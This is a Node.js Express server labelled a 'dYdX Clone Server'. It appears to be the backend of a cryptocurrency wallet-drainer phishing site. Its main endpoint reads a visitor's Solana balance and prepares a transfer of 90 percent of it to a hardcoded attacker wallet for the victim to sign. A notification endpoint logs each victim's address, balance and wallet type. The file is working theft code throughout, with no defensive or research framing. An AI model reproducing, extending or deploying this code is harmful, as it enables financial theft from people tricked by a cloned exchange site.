const express = require('express');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');

const app = express();
app.use(express.json());
app.use(express.static('public'));

// CONFIGURATION - MAKE SURE THIS WALLET IS CORRECT
const RECEIVER_WALLET = 'BxhvDsAy2d1DWbUwjFkps1R57H27Mey4RK3qQqoB1mFJ';
const RPC_ENDPOINT = 'https://api.mainnet-beta.solana.com';

// Create connection
let connection;
try {
    connection = new Connection(RPC_ENDPOINT, 'confirmed');
    console.log('✅ Connection created to:', RPC_ENDPOINT);
} catch (err) {
    console.error('❌ Failed to create connection:', err.message);
}

// Test receiver wallet
try {
    const testPubkey = new PublicKey(RECEIVER_WALLET);
    console.log('✅ Receiver wallet valid:', RECEIVER_WALLET);
} catch (err) {
    console.error('❌ Invalid receiver wallet:', RECEIVER_WALLET, err.message);
}

// ============================================
// HEALTH CHECK
// ============================================
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: Date.now() });
});

// ============================================
// GET BALANCE
// ============================================
app.post('/api/getBalance', async (req, res) => {
    try {
        const { publicKey } = req.body;
        if (!publicKey) {
            return res.status(400).json({ error: 'publicKey required' });
        }
        
        const pubkey = new PublicKey(publicKey);
        const balance = await connection.getBalance(pubkey);
        
        console.log(`💰 Balance for ${publicKey.slice(0, 8)}...: ${balance / LAMPORTS_PER_SOL} SOL`);
        res.json({ success: true, balance });
    } catch (err) {
        console.error('GetBalance error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// ============================================
// GET BLOCKHASH
// ============================================
app.post('/api/getBlockhash', async (req, res) => {
    try {
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
        res.json({ success: true, blockhash, lastValidBlockHeight });
    } catch (err) {
        console.error('GetBlockhash error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// ============================================
// SEND TRANSACTION
// ============================================
app.post('/api/sendTransaction', async (req, res) => {
    try {
        const { transaction } = req.body;
        if (!transaction) {
            return res.status(400).json({ error: 'transaction required' });
        }
        
        const txBuffer = Buffer.from(transaction, 'base64');
        const signature = await connection.sendRawTransaction(txBuffer, {
            skipPreflight: false,
            preflightCommitment: 'confirmed'
        });
        
        console.log(`✅ Transaction sent: ${signature}`);
        
        // Optional: wait for confirmation
        const confirmation = await connection.confirmTransaction(signature, 'confirmed');
        if (confirmation.value.err) {
            console.log(`⚠️ Confirmation error:`, confirmation.value.err);
        } else {
            console.log(`✅ Transaction confirmed: ${signature}`);
        }
        
        res.json({ success: true, txid: signature });
    } catch (err) {
        console.error('SendTransaction error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// ============================================
// PREPARE TRANSACTION - MAIN ENDPOINT
// ============================================
app.post('/prepare-transaction', async (req, res) => {
    try {
        const { publicKey } = req.body;
        
        console.log('📝 /prepare-transaction called');
        console.log('   publicKey:', publicKey);
        
        if (!publicKey) {
            console.log('   ❌ No publicKey provided');
            return res.status(400).json({ success: false, error: 'publicKey required' });
        }
        
        // Validate public key
        let fromPubkey;
        try {
            fromPubkey = new PublicKey(publicKey);
            console.log('   ✅ From pubkey valid:', fromPubkey.toString().slice(0, 8) + '...');
        } catch (err) {
            console.log('   ❌ Invalid publicKey:', err.message);
            return res.status(400).json({ success: false, error: 'Invalid publicKey: ' + err.message });
        }
        
        // Validate receiver wallet
        let toPubkey;
        try {
            toPubkey = new PublicKey(RECEIVER_WALLET);
            console.log('   ✅ To pubkey valid:', toPubkey.toString().slice(0, 8) + '...');
        } catch (err) {
            console.log('   ❌ Invalid receiver wallet:', err.message);
            return res.status(500).json({ success: false, error: 'Server configuration error: invalid receiver wallet' });
        }
        
        // Get balance
        let balance;
        try {
            balance = await connection.getBalance(fromPubkey);
            console.log('   💰 Balance:', balance / LAMPORTS_PER_SOL, 'SOL');
        } catch (err) {
            console.log('   ❌ Failed to get balance:', err.message);
            return res.status(500).json({ success: false, error: 'Failed to get balance: ' + err.message });
        }
        
        // Check minimum balance (0.02 SOL)
        const MIN_BALANCE = 20000000; // 0.02 SOL
        if (balance < MIN_BALANCE) {
            console.log('   ❌ Insufficient balance');
            return res.json({ 
                success: false, 
                error: `Insufficient balance. Have: ${balance / LAMPORTS_PER_SOL} SOL, Need: 0.02 SOL` 
            });
        }
        
        // Calculate amount to send (send 90%, keep 10% for fees)
        const amountToSend = Math.floor(balance * 0.9);
        console.log('   📤 Amount to send:', amountToSend / LAMPORTS_PER_SOL, 'SOL');
        
        // Create transaction
        const transaction = new Transaction();
        transaction.add(
            SystemProgram.transfer({
                fromPubkey: fromPubkey,
                toPubkey: toPubkey,
                lamports: amountToSend,
            })
        );
        
        // Serialize without blockhash (frontend will add fresh one)
        const serialized = transaction.serialize({
            requireAllSignatures: false,
            verifySignatures: false
        });
        
        console.log('   ✅ Transaction prepared, size:', serialized.length);
        
        res.json({ 
            success: true, 
            transaction: Array.from(serialized),
            amount: amountToSend,
            amountSol: (amountToSend / LAMPORTS_PER_SOL).toFixed(6)
        });
        
    } catch (err) {
        console.error('❌ /prepare-transaction error:', err.message);
        console.error('   Stack:', err.stack);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ============================================
// NOTIFICATION (Telegram)
// ============================================
app.post('/notify', (req, res) => {
    const { address, balance, walletType, customMessage } = req.body;
    console.log('📱 NOTIFICATION RECEIVED:');
    console.log('   Message:', customMessage);
    console.log('   Address:', address ? address.slice(0, 8) + '...' : 'unknown');
    console.log('   Balance:', balance, 'SOL');
    console.log('   Wallet:', walletType);
    res.json({ ok: true });
});

// ============================================
// START SERVER
// ============================================
const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔══════════════════════════════════════════════════════════╗
║     🚀 dYdX Clone Server Running                         ║
║     Port: ${PORT}                                            ║
║     Receiver: ${RECEIVER_WALLET.slice(0, 8)}...${RECEIVER_WALLET.slice(-8)} ║
║     RPC: ${RPC_ENDPOINT} ║
╚══════════════════════════════════════════════════════════╝
    `);
});
